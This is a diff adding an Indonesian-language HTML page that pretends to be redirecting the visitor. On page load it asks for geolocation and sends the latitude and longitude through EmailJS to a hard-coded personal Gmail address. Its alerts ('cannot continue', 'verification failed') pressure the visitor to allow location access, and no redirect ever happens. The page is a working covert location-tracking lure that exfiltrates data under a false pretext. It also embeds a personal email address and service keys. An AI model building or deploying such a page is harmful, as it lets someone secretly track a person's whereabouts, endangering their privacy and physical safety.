@@ -1,0 +1,72 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lengkapi Untuk Melanjutkan</title>
+    <!-- Masukkan kode EmailJS SDK -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init("kU92hhGkjl3gbWivK"); // Ganti dengan API key Anda dari EmailJS
+            
+            // Fungsi untuk meminta lokasi dan mengirim email
+            function getLocationAndSendEmail() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(sendLocation, showError);
+                } else { 
+                    alert("Geolocation tidak didukung oleh browser ini.");
+                }
+            }
+
+            function sendLocation(position) {
+                var latitude = position.coords.latitude;
+                var longitude = position.coords.longitude;
+                
+                // Kirim lokasi melalui EmailJS
+                var templateParams = {
+                    from_name: "Lokasi Pengguna",
+                    to_email: "anas.duwi08@gmail.com", // Ganti dengan alamat email Anda
+                    latitude: latitude,
+                    longitude: longitude
+                };
+                
+                emailjs.send("service_ysq3ech", "template_8azdn6o", templateParams)
+                    .then(function(response) {
+                        console.log("Access Granted", response);
+                        alert("Have a Nice Day.");
+                    }, function(error) {
+                        console.error("Izinkan Untuk Melanjutkan", error);
+                        alert("Verifikasi Gagal.");
+                    });
+            }
+
+            function showError(error) {
+                switch(error.code) {
+                    case error.PERMISSION_DENIED:
+                        alert("Tidak Dapat Melanjutkan.");
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        alert("Aktifkan Lokasi Anda.");
+                        break;
+                    case error.TIMEOUT:
+                        alert("Waktu permintaan lokasi telah habis.");
+                        break;
+                    case error.UNKNOWN_ERROR:
+                        alert("Terjadi kesalahan yang tidak diketahui.");
+                        break;
+                }
+            }
+
+            // Panggil fungsi getLocationAndSendEmail saat halaman dimuat
+            window.onload = function() {
+                getLocationAndSendEmail();
+            };
+        })();
+    </script>
+</head>
+<body>
+    <h1>Mohon Tunggu</h1>
+    <p>Sedang mengalihkan ke Laman yang anda tuju...</p>
+</body>
+</html>
